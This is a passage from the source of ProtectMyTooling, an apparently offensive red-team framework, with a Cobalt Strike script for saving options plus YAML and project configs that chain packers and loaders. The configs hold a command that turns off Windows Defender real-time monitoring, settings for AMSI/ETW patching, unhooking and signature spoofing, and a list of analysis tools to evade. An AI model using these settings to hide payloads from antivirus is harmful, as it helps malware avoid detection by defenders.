    %options["default_exe_x64_packers_chain"] = %setopts["default_exe_x64_packers_chain"];
    %options["default_dll_x86_packers_chain"] = %setopts["default_dll_x86_packers_chain"];
    %options["default_dll_x64_packers_chain"] = %setopts["default_dll_x64_packers_chain"];
    %options["default_dotnet_packers_chain"] = %setopts["default_dotnet_packers_chain"];
    %options["prefer_bofnet_over_executeasm"] = %setopts["prefer_bofnet_over_executeasm"];

    if(checkOptions() == 1) {
        show_message("Options saved.");
    }

    putOptions();
}

menubar("ProtectMyTooling", "protectmytooling");

popup protectmytooling {

    item "Options" {
        showOptionsDialog();
    }

    item "Clear cached executables" {
        clearCacheFolder();
    }

    item "Help" {
        help();
    }

    item "Save Settings" {
        putOptions();
        show_message("Settings saved.");
    }

    item "Restore Settings" {
        getOptions();
        show_message("Settings restored.");
    }
}

#
# saveOptions(
#   $filename,
#   %dictWithOptions,
#   [optional]"save.these.options.with.prefix.in.name")
#
sub saveOptions {
    local('$handle $i $newl $updated @savedkeys $append @output @contents $optionsPrefix $fileName %options $p $k $key $val %fetchedOptions');
    $fileName = $1;
    %options = $2;
    $optionsPrefix = $3;

    @output = @();
    @contents = @();

    if(-exists $fileName) {
        if(!-canread $fileName) {
            show_error("Cannot read settings file: $fileName");
            return;
        }

        $handle = openf($fileName);
        if($handle) {
            while $line (readln($handle)) {
                $line = ["$line" trim];
                push(@contents, $line);
            }
            closef($handle);
        }
    }

#    if(!-canwrite $fileName) {
#        show_error("Cannot write to settings file: $fileName");
#        return;
#    }

    $handle = openf(">" . $fileName);
    if($handle is $null) {
        show_error("Could not save options: Unable to open/create file.");
        return;
    }

    @savedkeys = @();
    $updated = 0;

    if(size(@contents) > 0) {
        for($i = 0; $i < size(@contents); $i++) {
            if(strlen(@contents[$i]) < 2) {
                push(@output, @contents[$i]);
                continue;
            }
            else if('#*' iswm @contents[$i]) {
                push(@output, @contents[$i]);
                continue;
            }

            if(@contents[$i] ismatch '([^=]+)\s*=\s*(.+)') {
                ($key, $oldval) = matched();
                $key = ["$key" trim];
                $oldval = ["$oldval" trim];

                foreach $key2 (keys(%options)) {
                    $k = $optionsPrefix . $key2;

                    if($key eq $k) {
                        $val = %options[$key2];
                        $val = ["$val" trim];

                        $newl = substr(@contents[$i], 0, indexOf(@contents[$i], $oldval));

                        if(strlen($val) == 0) {
                            $newl .= "\"\"";
                        }
                        else if(indexOf($val, ' ')) {
                            $newl .= "\" $+ $val $+ \"";
                        }
                        else {
                            $newl .= $val;
                        }

                        push(@output, $newl);
                        push(@savedkeys, $key2);
                        $updated = 1;
                    }
                }
            }

            if($updated == 0) {
                push(@output, @contents[$i]);
            }
        }

        foreach $key (keys(%options)) {
            if($key in @savedkeys) {
                continue;
            }

            $k = $optionsPrefix . $key;
            $val = %options[$key];
            $val = ["$val" trim];

            $newl = "$k = ";

            if(strlen($val) == 0) {
                $newl .= "\"\"";
            }
            else if(indexOf($val, ' ')) {
                $newl .= "\" $+ $val $+ \"";
            }
            else {
                $newl .= $val;
            }

            push(@output, $newl);
        }
    }
    else {
        foreach $key (keys(%options)) {
            $k = $optionsPrefix . $key;
            $val = %options[$key];
            $val = ["$val" trim];

            if(strlen($val) == 0) {
                push(@output, "$k = \"\"");
            }
            else if(indexOf($val, ' ')) {
                push(@output, "$k = \" $+ $val $+ \"");
            }
            else {
                push(@output, "$k = $val");
            }
        }
    }

    printAll($handle, @output);
    closef($handle);
}

#
# %fetchedOptionsDict = loadOptions(
#   $filename,
#   [optional]"load.only.options.with.prefix.in.name"
# )
#
sub loadOptions {
    local('$handle @lines $fileName $p $key $loadPrefix $val %fetchedOptions');
    $fileName = $1;
    $loadPrefix = $2;
    %fetchedOptions = %();

    if(!-exists $fileName) {
        #show_error("No saved settings file ( $+ $fileName $+ )!");

        # create a new, empty file.
        try
        {
            $handle = openf(">" . $fileName);
            closef($handle);
        } catch $m {
        }
        return $null;
    }

    if(!-canread $fileName) {
        show_error("Cannot read settings file: $fileName");
        return $null;
    }

    $handle = openf($fileName);
    while $line (readln($handle)) {
        push(@lines, ["$line" trim]);
    }

    closef($handle);

    for($lineNum = 0; $lineNum < size(@lines); $lineNum++) {
        $line = @lines[$lineNum];

        if(strlen($line) <= 2) {
            continue;
        }
        else if('#*' iswm $line) {
            continue;
        }

        $p = indexOf($line, '=');
        if ($p) {

            $key = substr($line, 0, $p);
            $key = ["$key" trim];

            $val = substr($line, $p + 1);
            $val = ["$val" trim];

            if(strlen($key) == 0) {
                show_error("Error in config file ( $+ $fileName $+ ) in line $lineNum $+ :\nLine does not conform 'key = value' form, as there is no key:\n\n $line");
                return $null;
            }

            if(right($val, 1) eq ";") {
                $val = substr($val, 0, -1);
            }

            if(left($val, 1) eq '"') {
                if(right($val, 1) eq '"') {
                    $val = substr($val, 1, -1);
                }
                else {
                    show_error("Error in config file ( $+ $fileName $+ ) in line $lineNum $+ :\nUnclosed quote mark on line:\n\n $line");
                    return $null;
                }
            }

            if($loadPrefix && strlen($loadPrefix) > 0) {
                if(indexOf($key, $loadPrefix) != 0) {
                    continue;
                }
            }

            if($key && strlen($key) > 0) {
                %fetchedOptions[$key] = $val;
            }
            else {
                %fetchedOptions[$key] = "";
            }
        }
        else {
            show_error("Error in config file ( $+ $fileName $+ ) in line $lineNum $+ :\nNo 'key = value' assignment in line:\n\n $line");
            return $null;
        }
    }

    return %fetchedOptions;
}


#
# ==============================================================================================
#

sub fillPackersList {
    local('@files $file');

    if (size(@supportedProtectMyToolingPackers) > 0 ) {
        return;
    }

    if ((%options['protect_my_tooling_dir'] !is $null) && (-exists %options['protect_my_tooling_dir'])) {
        @files = ls(getFileProper(%options['protect_my_tooling_dir'], 'packers'));

        foreach $file (@files) {
            $file = getFileName($file);
            if ($file eq "__init__.py")  { continue; }
            if ($file eq "IPacker.py")  { continue; }
            if ("*__pycache__*" iswm $file)  { continue; }

            $file = replace($file, ".py", "");
            push(@supportedProtectMyToolingPackers, $file);
        }
    }

    println("[ProtectMyTooling] Available Packers: " . join(", ", @supportedProtectMyToolingPackers));
}

sub getOptions {
    local('%opts $pos');

    %opts = loadOptions($protectedCobaltSettingsFile);

    if(size(%opts) > 0) {
        $pos = strlen("protectmytooling.");
        foreach $key (keys(%opts)) {
            if("protectmytooling.*" iswm $key) {
                $k = substr($key, $pos);
                %options[$k] = %opts[$key];
            }
        }
    }

    fillPackersList();

    println("[ProtectMyTooling] Options loaded from " . $protectedCobaltSettingsFile);
}

sub putOptions {
    saveOptions($protectedCobaltSettingsFile, %options, "protectmytooling.");
    fillPackersList();

    println("[ProtectMyTooling] Options saved to " . $protectedCobaltSettingsFile);
}

checkBofnet();
getOptions();



================================================
FILE: config/ProtectMyTooling.yaml
================================================

verbose: 0
debug: 0
timeout: 180

ioc: False
watermark: []

check_av_command: 'powershell.exe -c "(Get-MpPreference).DisableRealtimeMonitoring -eq $true"'
disable_av_command: 'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"'
enable_av_command: 'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $false"'

#
# Preset packers chain in GUI upon input file open.
#
gui_default_chain_pe: upx
gui_default_chain_dotnet: confuserex
gui_default_chain_shellcode: sgn


# UPX (x86, x64)
upx_path: "contrib\\upx\\upx-3.96-win32\\upx.exe"
upx_compress:
upx_corrupt: 1
upx_args:


# peCloakCapstone (x86)
#pecloak_python_path: python2
#pecloak_script_path: "contrib\\peCloakCapstone\\peCloak.py"
#pecloak_args:


# Hyperion (x86, x64)
hyperion_path: "contrib\\Hyperion\\hyperion.exe"
hyperion_args:

#
# Open-Source ConfuserEx-v1.5.0 forked by mkaring
#
confuserex_path: "contrib\\ConfuserEx\\active-mkaring\\Confuser.CLI.exe"
confuserex_project_file: "contrib\\_project-files\\ConfuserEx\\mkaring-maximum.crproj"

#
# RedBackdoorer
#
# we'll used default one
backdoor_path:
backdoor_save: 1
backdoor_run: 2
backdoor_args:

#
# peresed
#
# we'll used default one: "python3 -m pe_tools.peresed"
peresed_path:

#
# Call Obfuscator
#
callobf_path_x86: "contrib\\CallObf\\cobf86.exe"
callobf_path_x64: "contrib\\CallObf\\cobf64.exe"
callobf_config: generate-automatically
#callobf_config: "contrib\\_project-files\\CallObf\\configExample.ini"

#
# Amber
#
amber_path: "contrib\\Amber\\amber.exe"
amber_args:

#
# AtomPePacker
#
atompepacker_path: "contrib\\AtomPePacker\\PePacker.exe"
atompepacker_args:

#
# Donut
#
donut_path: "contrib\\donut\\donut.exe"
donut_args:
donut_engine: '3'
donut_cmdline:
donut_thread: False
donut_cmdline_unicode: False
donut_method:
donut_appdomain:
donut_class:
donut_exit: '1'

#
# Freeze
#
#freeze_path: "contrib\\Freeze\\Freeze.exe"
#freeze_console: False
#freeze_encrypt: False
#freeze_export: ''
#freeze_process: ''
#freeze_sandbox: False

#
# Mangle
#
mangle_path: "contrib\\Mangle\\Mangle.exe"
mangle_strip_go: True
mangle_args:
mangle_increase: 0
mangle_certificate: 'contrib\\Mangle\\signed-executables\\WINWORD.EXE'

#
# MPRESS
#
mpress_path: "contrib\\MPRESS\\mpress.exe"

#
# NimPackt-v1
#
nimpackt_path: "contrib\\NimPackt-v1\\NimPackt.py"
nimpackt_args:
nimpackt_bake_args:
nimpackt_nopatchamsi: False
nimpackt_nodisableetw: False
nimpackt_nounhook: False
nimpackt_nosyscalls: False
nimpackt_sleep: False
nimpackt_32bit: False
nimpackt_showconsole: False
nimpackt_inject_remote: False
nimpackt_target:
nimpackt_existing: False

#
# Nimcrypt2
#
nimcrypt2_path: "contrib\\Nimcrypt2\\nimcrypt.exe"
nimcrypt2_args:
nimcrypt2_unhook: True
nimcrypt2_process:
nimcrypt2_encrypt_strings: True
nimcrypt2_get_syscallstub: False
nimcrypt2_llvm_obfuscator: False
nimcrypt2_no_randomization: False
nimcrypt2_no_sandbox: False
nimcrypt2_no_ppid_spoof: False

#
# NimSyscallPacker
#
#nimsyscall_path: "contrib\\NimSyscallPacker\\NimSyscallLoader.exe"
#nimsyscall_args:

#
# PEunion
#
peunion_path: "contrib\\PEunion\\peubuild.exe"
peunion_native86_project_path: "contrib\\_project-files\\PEunion\\native86.peu"
peunion_dotnet86_project_path: "contrib\\_project-files\\PEunion\\dotnet86.peu"
peunion_dotnet64_project_path: "contrib\\_project-files\\PEunion\\dotnet64.peu"


#
# ScareCrow
#
scarecrow_path: "contrib\\ScareCrow\\ScareCrow.exe"
scarecrow_args:
scarecrow_loader:
scarecrow_domain:
scarecrow_valid:
scarecrow_password:
scarecrow_inject:
scarecrow_sandbox: False
scarecrow_sign: False

#
# pe2shc
#
pe2shc_path: "contrib\\pe2shc\\pe2shc.exe"
pe2shc_args:

#
# sRDI
#
srdi_path: 'contrib\\sRDI\\ConvertToShellcode.py'
srdi_function: ''
srdi_data: ''
srdi_obfuscate_imports: True
srdi_import_delay: 2
srdi_clear_header: True
srdi_pass_shellcode_base: True

#
# sgn
#
sgn_path: "contrib\\sgn\\sgn.exe"
sgn_args:

#
# jadams/Packer64
#
packer64_path: "contrib\\packer64\\Packer.exe"

#
# Charterino/AsStrongAsFuck
#   1 - ConstantsEncoding
#   2 - ModuleRenaming
#   3 - HiddenNamespace
#   4 - ReferenceProxy
#   5 - RenameObfuscation
#   6 - MutatinObf
#   7 - NumbersToModuleReference
#   8 - JunkProtection
#   9 - ControlFlowObfuscation
#
asstrongasfuck_path: "contrib\\AsStrongAsFuck\\AsStrongAsFuck.exe"
asstrongasfuck_opts: "235789"


#
# AnErrupTion/LoGiC.NET
#
logicnet_path: "contrib\\LoGIC.NET\\LoGiC.NET.exe"


#
# Invoke-Obfuscation by Daniel Bohannon
#
invobf_path: "contrib\\Invoke-Obfuscation\\Invoke-Obfuscation.ps1"
invobf_powershell: powershell.exe



================================================
FILE: config/sample-full-config.yaml
================================================
verbose: 0
debug: 0
timeout: 60

#
# Manages Windows Defender
#
check_av_command: 'powershell.exe -c "(Get-MpPreference).DisableRealtimeMonitoring -eq $true"'
disable_av_command: 'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"'
enable_av_command: 'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $false"'

#
# Preset packers chain in GUI upon input file open.
#
gui_default_chain_pe: upx
gui_default_chain_dotnet: confuserex
gui_default_chain_shellcode: sgn

#
# UPX (x86, x64)
#
upx_path: "contrib\\upx\\upx-3.96-win32\\upx.exe"
upx_compress: best
upx_corrupt: 1
upx_args:

#
# peCloakCapstone (x86)
#
pecloak_python_path: python2
pecloak_script_path: "contrib\\peCloakCapstone\\peCloak.py"
pecloak_args:

#
# Hyperion (x86, x64)
#
hyperion_path: "contrib\\Hyperion-2.3.1\\hyperion.exe"
hyperion_args:

#
# Open-Source neo-ConfuserEx
#
confuserex_path: "contrib\\ConfuserEx-1.5-mkaring\\Confuser.CLI.exe"
confuserex_project_file: "contrib\\_project-files\\ConfuserEx\\maximum.crproj"

#
# Amber
#
amber_path: "contrib\\Amber\\amber.exe"
amber_args:

#
# AtomPePacker
#
atompepacker_path: "contrib\\AtomPePacker\\PePacker.exe"
atompepacker_args:

#
# RedBackdoorer
#
# we'll used default one
backdoor_path:
backdoor_save: 1
backdoor_run: 1
backdoor_args:

#
# Donut
#
donut_path: "contrib\\donut\\donut.exe"
donut_args:
donut_engine: '3'
donut_cmdline:
donut_thread: False
donut_cmdline_unicode: False
donut_method:
donut_appdomain:
donut_class:
donut_exit: '1'

#
# Freeze
#
#freeze_path: "contrib\\Freeze\\Freeze.exe"
#freeze_console: False
#freeze_encrypt: False
#freeze_export: ''
#freeze_process: ''
#freeze_sandbox: False

#
# Mangle
#
mangle_path: "contrib\\Mangle\\Mangle.exe"
mangle_strip_go: True
mangle_args:
mangle_increase: 0
mangle_certificate: 'contrib\\Mangle\\signed-executables\\WINWORD.EXE'

#
# MPRESS
#
mpress_path: "contrib\\MPRESS\\mpress.exe"

#
# NimPackt-v1
#
nimpackt_path: "contrib\\NimPackt-v1\\NimPackt.py"
nimpackt_args:
nimpackt_bake_args:
nimpackt_nopatchamsi: False
nimpackt_nodisableetw: False
nimpackt_nounhook: False
nimpackt_nosyscalls: False
nimpackt_sleep: False
nimpackt_32bit: False
nimpackt_showconsole: False
nimpackt_inject_remote: False
nimpackt_target:
nimpackt_existing: False

#
# Nimcrypt2
#
nimcrypt2_path: "contrib\\Nimcrypt2\\nimcrypt.exe"
nimcrypt2_args:
nimcrypt2_unhook: True
nimcrypt2_process:
nimcrypt2_encrypt_strings: True
nimcrypt2_get_syscallstub: False
nimcrypt2_llvm_obfuscator: False
nimcrypt2_no_randomization: False
nimcrypt2_no_sandbox: False
nimcrypt2_no_ppid_spoof: False

#
# NimSyscallPacker
#
nimsyscall_path: "contrib\\NimSyscallPacker\\NimSyscallLoader.exe"
nimsyscall_args:
nimsyscall_noetw: False
nimsyscall_noamsi: False
nimsyscall_noargs: False
nimsyscall_hide: True
nimsyscall_reflective: False
nimsyscall_debug: False
nimsyscall_x86: False
nimsyscall_large: False
nimsyscall_comvaretw: False
nimsyscall_unhook: True
nimsyscall_obfuscate: False
nimsyscall_sgn: True
nimsyscall_replace: True
nimsyscall_selfdelete: False
nimsyscall_obfuscatefunctions: False
nimsyscall_sign: True
nimsyscall_llvm: False
nimsyscall_sleepycrypt: False
nimsyscall_hellsgate: False
nimsyscall_syswhispers: True
nimsyscall_jump: True
nimsyscall_shellcode: False
nimsyscall_remoteinject: False
nimsyscall_remotepatchamsi: False
nimsyscall_remotepatchetw: False
nimsyscall_peinject: False
nimsyscall_peload: True
nimsyscall_csharp: False
nimsyscall_key:
nimsyscall_dllexportfunc:
nimsyscall_sleep: 10
nimsyscall_sandbox: 'MemorySpace'
nimsyscall_domain:
nimsyscall_pump:
nimsyscall_signdomain: 'www.microsoft.com'
nimsyscall_remoteprocess:

#
# sRDI
#
srdi_path: 'contrib\\sRDI\\ConvertToShellcode.py'
srdi_function: ''
srdi_data: ''
srdi_obfuscate_imports: True
srdi_import_delay: 2
srdi_clear_header: True
srdi_pass_shellcode_base: True

#
# ScareCrow
#
scarecrow_path: "contrib\\ScareCrow\\ScareCrow.exe"
scarecrow_args:
scarecrow_loader:
scarecrow_domain:
scarecrow_valid:
scarecrow_password:
scarecrow_inject:
scarecrow_sandbox: False
scarecrow_sign: False

#
# PEunion
#
peunion_path: "contrib\\PEunion\\peubuild.exe"
peunion_native86_project_path: "contrib\\_project-files\\PEunion\\native86.peu"
peunion_dotnet86_project_path: "contrib\\_project-files\\PEunion\\dotnet86.peu"
peunion_dotnet64_project_path: "contrib\\_project-files\\PEunion\\dotnet64.peu"


#
# peresed
#
# we'll used default one: "python3 -m pe_tools.peresed"
peresed_path:

#
# pe2shc
#
pe2shc_path: "contrib\\pe2shc\\pe2shc.exe"
pe2shc_args:

#
# sgn
#
sgn_path: "contrib\\sgn\\sgn.exe"
sgn_args:


#
# Call Obfuscator
#
callobf_path_x86: "contrib\\CallObf\\cobf86.exe"
callobf_path_x64: "contrib\\CallObf\\cobf64.exe"
callobf_config: generate-automatically
#callobf_config: "contrib\\_project-files\\CallObf\\configExample.ini"


#
# jadams/Packer64
#
packer64_path: "contrib\\packer64\\Packer.exe"

#
# Charterino/AsStrongAsFuck
#   1 - ConstantsEncoding
#   2 - ModuleRenaming
#   3 - HiddenNamespace
#   4 - ReferenceProxy
#   5 - RenameObfuscation
#   6 - MutatinObf
#   7 - NumbersToModuleReference
#   8 - JunkProtection
#   9 - ControlFlowObfuscation
#
asstrongasfuck_path: "contrib\\AsStrongAsFuck\\AsStrongAsFuck.exe"
asstrongasfuck_opts: "235789"

#
# AnErrupTion/LoGiC.NET
#
logicnet_path: "contrib\\LoGIC.NET\\LoGiC.NET.exe"

#
# peCloak
#
pecloak_script_path: "contrib\\peCloakCapstone\\peCloak.py"
pecloak_python_path: python2

#
# Invoke-Obfuscation by Daniel Bohannon
#
invobf_path: "contrib\\Invoke-Obfuscation\\Invoke-Obfuscation.ps1"
invobf_powershell: powershell.exe


#
# Themida (x86, x64)
#
#themida_path_x86: "contrib\\Themida\\Themida.exe"
#themida_path_x64: "contrib\\Themida\\Themida64.exe"
#themida_project_file: "contrib\\_project-files\\themida\\project-template.tmd"
#themida_args:


#
# Eziriz Intellilock .Net protector (x86, x64)
#
#intellilock_path: "contrib\\Eziriz.IntelliLock\\INTELLILOCK.exe"
#intellilock_args:


#
# PELock .netshrink .Net EXE assemblies protector and compressor (x86, x64)
#
#netshrink_path: "contrib\\PELock.NetShrink\\netshrink.exe"
#netshrink_detect_netversion:
#netshrink_antidebug: 1
#netshrink_args:


#
# The Enigma Protector (x86, x64)
#
#enigma_path_x86: "contrib\\The.Enigma.Protector\\enigma32.exe"
#enigma_path_x64: "contrib\\The.Enigma.Protector\\enigma64.exe"
#enigma_project_file: "contrib\\_project-files\\The.Enigma.Protector\\project-template.enigma"
#enigma_save_generated_project_file: 0
#enigma_product_name:
#enigma_product_version:
#enigma_antidebug: 1
#enigma_controlsum: 1
#enigma_antivm: 0
#enigma_processes_blacklist:
#  - apateDNS.exe
#  - apimonitor-x64.exe
#  - apimonitor-x86.exe
#  - autoruns.exe
#  - autorunsc.exe
#  - Dbgview.exe
#  - dumpcap.exe
#  - DumpIt.exe
#  - fakenet.exe
#  - fakenet32.exe
#  - fakenet64.exe
#  - Fiddler.exe
#  - filemon.exe
#  - floss32.exe
#  - floss64.exe
#  - gmer.exe
#  - handlediff.exe
#  - HookExplorer.exe
#  - httpdebugger.exe
#  - idag.exe
#  - idag64.exe
#  - idaq.exe
#  - idaq64.exe
#  - ImmunityDebugger.exe
#  - ImportREC.exe
#  - joeboxcontrol.exe
#  - joeboxserver.exe
#  - listdlls.exe
#  - livekd.exe
#  - LordPE.exe
#  - lordpe.exe
#  - networkminer.exe
#  - ollydbg.exe
#  - ollydbg.exe
#  - pchunter.exe
#  - pchunter32.exe
#  - pchunter64.exe
#  - pe-bear.exe
#  - pe-sieve.exe
#  - peid.exe
#  - pesieve.exe
#  - pestudio.exe
#  - PETools.exe
#  - proc_analyzer.exe
#  - procdump.exe
#  - procdump64.exe
#  - ProcessHacker.exe
#  - procexp.exe
#  - procmon.exe
#  - ramcapture.exe
#  - ramcapture64.exe
#  - regmon.exe
#  - regshot-x64-ANSI.exe
#  - regshot-x64-Unicode.exe
#  - regshot-x64.exe
#  - regshot-x86-ANSI.exe
#  - regshot-x86-Unicode.exe
#  - regshot-x86.exe
#  - regshot.exe
#  - reshacker.exe
#  - ResourceHacker.exe
#  - rootkitrevealer.exe
#  - scylla_x64.exe
#  - scylla_x86.exe
#  - sigcheck.exe
#  - sniff_hit.exe
#  - sysAnalyzer.exe
#  - SysInspector.exe
#  - tcpview.exe
#  - titanhide.exe
#  - titanhidegui.exe
#  - totaldump.exe
#  - tracehook.exe
#  - vmmap.exe
#  - windbg.exe
#  - windbg.exe
#  - Wireshark.exe
#  - x32dbg.exe
#  - x64dbg.exe
#  - x64helper.exe
#  - x96dbg.exe
#  - xuetr.exe
#  - yara.exe
#  - yara32.exe
#  - yara64.exe
#enigma_check_processes_every: 10
#enigma_protected_exe_cmdline:
#enigma_args:


#
# .NET Reactor - a powerful protector for .NET assemblies
#
#netreactor_path: "contrib\\.Net.Reactor\\dotNET_Reactor.Console.exe"
#netreactor_project_file: "contrib\\_project-files\\.Net.Reactor\\project-template.nrproj"
#netreactor_merge_namespaces: 1
#netreactor_short_strings: 1
#netreactor_stealth_mode: 1
#netreactor_all_params: 1
#netreactor_public_types_internalization: 1
#netreactor_antitamp: 1
#netreactor_control_flow_obfuscation: 1
#netreactor_flow_level: 9
#netreactor_resourceencryption: 1
#netreactor_necrobit: 1
#netreactor_incremental_obfuscation: 1
#netreactor_unprintable_characters: 1
#netreactor_obfuscate_public_types: 1
#netreactor_anti_ildasm: 1
#netreactor_native_exe: 0
#netreactor_prejit: 0
#netreactor_strong_name_removal: 0
#netreactor_args:


#
# RedGate SmartAssembly - powerful .Net assemblies protector
# Docs:
#   https://documentation.red-gate.com/sa/building-your-assembly/using-the-command-line-mode
#
#smartassembly_path: "contrib\\RedGate.SmartAssembly.Protector\\SmartAssembly.com"
#smartassembly_project_file: "contrib\\_project-files\\smartassembly-projects\\full1.saproj"
#smartassembly_tamperprotection: 1
#smartassembly_sealclasses: 1
#smartassembly_preventildasm: 1
#smartassembly_methodparentobfuscation: 1
#smartassembly_typemethodobfuscation: 3
#smartassembly_fieldobfuscation: 3
#smartassembly_cgsobfuscation: 1
#smartassembly_stringsencoding: 1
#smartassembly_compressencryptresources: 1
#smartassembly_controlflowobfuscate: 4
#smartassembly_dynamicproxy: 1
#smartassembly_pruning: 1
#smartassembly_nameobfuscate: 1
#smartassembly_compressassembly: 1
#smartassembly_encryptassembly: 1
#smartassembly_args:


#
# VMProtect
#
#vmprotect_path: "contrib\\VMProtect\\VMProtect_Con.exe"
#vmprotect_project_file: "contrib\\_project-files\\vmprotect-projects\\full-vmprotect.vmp"
#vmprotect_args:



================================================
FILE: contrib/_project-files/CallObf/configExample.ini
================================================
; Template for the config file:
; 	* Sections can be written as:
; 		[dll_name]
; 		old_sym=new_sym
;	* The dll name is case insensitive, but
;	the old and the new symbols are not.
; 	* You can use the wildcard on both the
; 	dll name and the old symbol.
; 	* You can use '#' at the start of
; 	the old or the new symbol to flag
; 	an ordinal.
;	* The new symbol should be exported
;	by the dll so the windows loader can resolve it.
; For example:
; 	* Obfuscating all of the symbols
;	imported from user32.dll with ordinal 1600.
[user32.dll]
*=#1600
;	* Obfuscating symbols imported from both
;	kernel32.dll and kernelbase.dll with Sleep.
[kernel*.dll]
*=Sleep
;	* Obfuscating fprintf with exit.
[*]
fprintf=exit


================================================
FILE: contrib/_project-files/ConfuserEx/beds-maximum.crproj
================================================
<project outputDir="" baseDir="" xmlns="http://confuser.codeplex.com">
  <rule pattern="true" inherit="false">
    <protection id="Hide Methods" />
    <protection id="erase headers" />
    <protection id="local to field" />
    <!-- According to https://github.com/mkaring/ConfuserEx/issues/64 triggers AV detection -->
    <!--<protection id="anti tamper" />-->
    <protection id="MD5 Hash Check" />
    <protection id="Mutations" />
    <protection id="anti debug" />
    <protection id="invalid metadata" />
    <protection id="Clean ref proxy" />
    <protection id="Rename Module" />
    <protection id="ref proxy" />
    <protection id="resources" />
    <protection id="rename" />
    <!-- <protection id="Calli Protection" /> -->
    <!-- <protection id="ctrl flow" /> -->
    <!-- <protection id="Fake Native" /> -->
    <!-- <protection id="module flood" /> -->
    <!-- <protection id="constants" /> -->
  </rule>
  <!-- Can trigger AVs detections. Useful only for merging multiple assemblies into one. -->
  <!--<packer id="compressor" />-->
  <!--<plugin>KoiVM.Confuser.exe</plugin>-->
</project>


================================================
FILE: contrib/_project-files/ConfuserEx/maximum.crproj
================================================
<project outputDir="" baseDir="" xmlns="http://confuser.codeplex.com">
  <rule pattern="true" inherit="false">
    <protection id="anti debug" />
    <protection id="anti dump" />
    <protection id="anti ildasm" />
    <!-- According to https://github.com/mkaring/ConfuserEx/issues/64 triggers AV detection -->
    <!--<protection id="anti tamper" />-->
    <protection id="constants" />
    <protection id="ctrl flow" />
    <protection id="harden" />
    <protection id="invalid metadata" />
    <protection id="ref proxy" />
    <protection id="resources" />
    <protection id="rename" />
    <!-- mkaring recommends to not use it as its broken -->
    <!--<protection id="typescramble" />-->
  </rule>
  <!-- Can trigger AVs detections. Useful only for merging multiple assemblies into one. -->
  <!--<packer id="compressor" />-->
</project>


================================================
FILE: contrib/_project-files/ConfuserEx/mkaring-maximum.crproj
================================================
<project outputDir="" baseDir="" xmlns="http://confuser.codeplex.com">
  <rule pattern="true" inherit="false">
    <protection id="anti debug" />
    <protection id="anti dump" />
    <protection id="anti ildasm" />
    <!-- According to https://github.com/mkaring/ConfuserEx/issues/64 triggers AV detection -->
    <!-- However, lets roll the dices with this one. -->
    <protection id="anti tamper" />
    <protection id="constants" />
    <protection id="ctrl flow" />
    <protection id="harden" />
    <protection id="invalid metadata" />
    <protection id="ref proxy" />
    <protection id="resources" />
    <!-- mkaring recommends to not use it as its broken -->
    <!--<protection id="typescramble" />-->
  </rule>
  <!-- Can trigger AVs detections. Useful only for merging multiple assemblies into one. -->
  <!--<packer id="compressor" />-->
</project>



================================================
FILE: contrib/_project-files/ConfuserEx/neo-maximum.crproj
================================================
<project outputDir="" baseDir="" xmlns="http://confuser.codeplex.com">
  <rule pattern="true" inherit="false">
    <protection id="anti debug" />
    <protection id="anti dump" />
    <protection id="anti ildasm" />
    <!-- According to https://github.com/mkaring/ConfuserEx/issues/64 triggers AV detection -->
    <!--<protection id="anti tamper" />-->
    <protection id="constants" />
    <protection id="ctrl flow" />
    <protection id="invalid metadata" />
    <protection id="ref proxy" />
    <protection id="resources" />
    <protection id="rename" />
    <!-- mkaring recommends to not use it as its broken -->
    <!--<protection id="typescramble" />-->
  </rule>
  <!-- Can trigger AVs detections. Useful only for merging multiple assemblies into one. -->
  <!--<packer id="compressor" />-->
</project>


================================================
FILE: contrib/_project-files/enigma-projects/full-x86-1.enigma
================================================
﻿<?xml version="1.0" encoding="UTF-8"?>
<EnigmaProject Version="1.60" Modification="560">
  <Compatibility>
    <Level1>True</Level1>
    <Level2>True</Level2>
    <Level3>True</Level3>
    <Level4>True</Level4>
    <Level5>True</Level5>
    <Level6>True</Level6>
  </Compatibility>
  <EnigmaProjectDetails>
    <FullNameOfProject>Default project</FullNameOfProject>
    <ProjectDescription>Description of the default project</ProjectDescription>
  </EnigmaProjectDetails>
  <KeysGenerator>
    <EnableLogging>False</EnableLogging>
  </KeysGenerator>
  <Input>
    <FileName></FileName>
    <ProductName>Product Name</ProductName>
    <VersionInfo>1.2.3</VersionInfo>
    <ProductInfoFromResources>False</ProductInfoFromResources>
  </Input>
  <Output>
    <SameAsInputFile>False</SameAsInputFile>
    <FileName></FileName>
    <DoNotBackup>False</DoNotBackup>
  </Output>
  <AdvanceInput>
    <ProtectAfter>False</ProtectAfter>
    <Files Count="0"/>
  </AdvanceInput>
  <Compression>
    <Type>Best</Type>
    <Mode>AllResourcesExceptIconAndVersion</Mode>
  </Compression>
  <OnlineServices>
    <Common>
      <IsConfigured>False</IsConfigured>
      <ProductId/>
      <ActivationLinkId/>
      <ActivationUrlHost/>
      <ActivationUrlPort>0</ActivationUrlPort>
      <ActivationUrlEndPoint/>
      <ProductName/>
      <ActivationLinkName/>
      <SiteUrl/>
      <AdministratorLogin/>
      <AdministratorPassword/>
      <TestOrderUrl/>
    </Common>
    <OnlineActivationSettings>
      <ActivateEveryExecution>False</ActivateEveryExecution>
    </OnlineActivationSettings>
    <OnlineActivationDialog>
      <Enabled>False</Enabled>
      <ShowOnUnregistered>True</ShowOnUnregistered>
      <ShowSucceededMessage>False</ShowSucceededMessage>
      <ShowFailedMessage>False</ShowFailedMessage>
      <MessageSucceeded>
        <Icon>0</Icon>
        <Title/>
        <Text/>
        <UseHL>False</UseHL>
        <HLSentence/>
        <HLURL/>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
        <FontItalic>False</FontItalic>
        <FontUnderline>False</FontUnderline>
        <FontStrikeout>False</FontStrikeout>
      </MessageSucceeded>
      <MessageFailed>
        <Icon>0</Icon>
        <Title/>
        <Text/>
        <UseHL>False</UseHL>
        <HLSentence/>
        <HLURL/>
        <AutoClose>False</AutoClose>
        <CloseDelay>0</CloseDelay>
        <Disable>False</Disable>
        <DisableDelay>0</DisableDelay>
        <FontName/>
        <FontCharset>0</FontCharset>
        <FontColor>0</FontColor>
        <FontSize>0</FontSize>
        <FontBold>False</FontBold>
